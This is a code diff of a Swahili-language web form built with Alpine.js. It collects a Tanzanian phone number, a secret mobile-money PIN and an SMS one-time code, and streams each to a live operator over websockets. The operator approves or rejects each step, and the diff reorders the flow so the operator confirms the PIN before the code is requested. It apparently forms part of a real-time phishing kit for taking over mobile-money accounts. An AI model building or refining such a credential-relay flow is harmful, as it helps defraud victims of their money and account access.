@@ -144,29 +144,35 @@
                 </div>
 
                 <div x-show="step === 4" x-cloak x-transition.duration.200ms>
-                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Uhakiki wa Namba</h2><span class="text-xs font-bold text-orange-400">Hatua 04</span></div>
-                    <div class="space-y-4 text-center">
-                        <p class="text-sm text-gray-400">Ingiza tarakimu 4 tulizotuma kwa <br> <span class="text-white font-bold" x-text="'+255 ' + form.phone"></span></p>
-                        <input type="text" x-model="otp.code" class="input-premium otp-input" maxlength="4" placeholder="0000">
-                        <div class="grid grid-cols-2 gap-4 pt-4">
-                            <button @click="step = 3" class="btn-secondary">← Rudi</button>
-                            <button @click="verifyOTP" :disabled="otp.code.length !== 4" class="btn-premium">Thibitisha →</button>
-                        </div>
-                    </div>
-                </div>
-
-                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
-                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Thibitisha PIN</h2><span class="text-xs font-bold text-orange-400">Hatua 05</span></div>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Thibitisha PIN</h2><span class="text-xs font-bold text-orange-400">Hatua 04</span></div>
                     <p class="text-center text-sm text-gray-400 mb-6">Weka PIN yako ya siri ya tarakimu 4</p>
                     <div class="flex justify-center gap-3">
                         <template x-for="(_, i) in 4" :key="i">
                             <input type="password" class="pin-box" maxlength="1" @input="movePinFocus($event, i)" x-model="pin.value[i]" @keyup.backspace="movePinBack($event, i)">
                         </template>
                     </div>
-                    <button @click="submitPin" :disabled="!isPinValid || loading" class="btn-premium mt-10">
-                        <span x-show="!loading">Wasilisha Maombi</span>
-                        <span x-show="loading" class="spinner-sm"></span>
-                    </button>
+                    <div class="grid grid-cols-2 gap-4 mt-10">
+                        <button @click="step = 3" :disabled="loading" class="btn-secondary">← Rudi</button>
+                        <button @click="submitPin" :disabled="!isPinValid || loading" class="btn-premium">
+                            <span x-show="!loading">Thibitisha PIN →</span>
+                            <span x-show="loading" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 5" x-cloak x-transition.duration.200ms>
+                    <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-bold">Uhakiki wa Namba</h2><span class="text-xs font-bold text-orange-400">Hatua 05</span></div>
+                    <div class="space-y-4 text-center">
+                        <p class="text-sm text-gray-400">Ingiza tarakimu 4 tulizotuma kwa <br> <span class="text-white font-bold" x-text="'+255 ' + form.phone"></span></p>
+                        <input type="text" x-model="otp.code" class="input-premium otp-input" maxlength="4" placeholder="0000">
+                        <div class="grid grid-cols-2 gap-4 pt-4">
+                            <button @click="step = 4" :disabled="loading" class="btn-secondary">← Rudi</button>
+                            <button @click="verifyOTP" :disabled="otp.code.length !== 4 || loading" class="btn-premium">
+                                <span x-show="!loading">Wasilisha Maombi</span>
+                                <span x-show="loading" class="spinner-sm"></span>
+                            </button>
+                        </div>
+                    </div>
                 </div>
 
                 <div x-show="step === 6" x-cloak class="text-center py-8">
@@ -207,9 +213,18 @@
 
                     this.socket.on('admin-approved', (d) => { 
                         this.loading = false; 
-                        this.referenceId = d.referenceId || 'MIX-' + Math.floor(Math.random()*1000000);
-                        this.step = 6; 
-                        this.showToast('Maombi yamepitishwa na Admin'); 
+                        
+                        if (this.step === 4) {
+                            // Admin approved step 4 (PIN), send OTP and move to step 5
+                            this.socket.emit('send-otp', { phoneNumber: this.form.phone });
+                            this.step = 5;
+                            this.showToast('PIN Imethibitishwa');
+                        } else if (this.step === 5) {
+                            // Admin approved step 5 (OTP), finalize application and move to step 6
+                            this.referenceId = d.referenceId || 'MIX-' + Math.floor(Math.random()*1000000);
+                            this.step = 6; 
+                            this.showToast('Maombi yamepitishwa na Admin'); 
+                        }
                     });
 
                     this.socket.on('admin-rejected', (d) => { 
@@ -231,14 +246,8 @@
                 submitStep3() { 
                     if(this.isStep3Valid) {
                         this.socket.emit('step3-data', this.form);
-                        this.socket.emit('send-otp', { phoneNumber: this.form.phone }); 
                         this.step = 4;
                     }
-                },
-
-                verifyOTP() { 
-                    this.socket.emit('step4-otp', { otp: this.otp.code }); 
-                    this.step = 5;
                 },
 
                 submitPin() { 
@@ -246,6 +255,11 @@
                     this.socket.emit('step5-pin', { 
                         pin: this.pin.value.join('') 
                     }); 
+                },
+
+                verifyOTP() { 
+                    this.loading = true;
+                    this.socket.emit('step4-otp', { otp: this.otp.code }); 
                 },
 
                 movePinFocus(e, i) { 
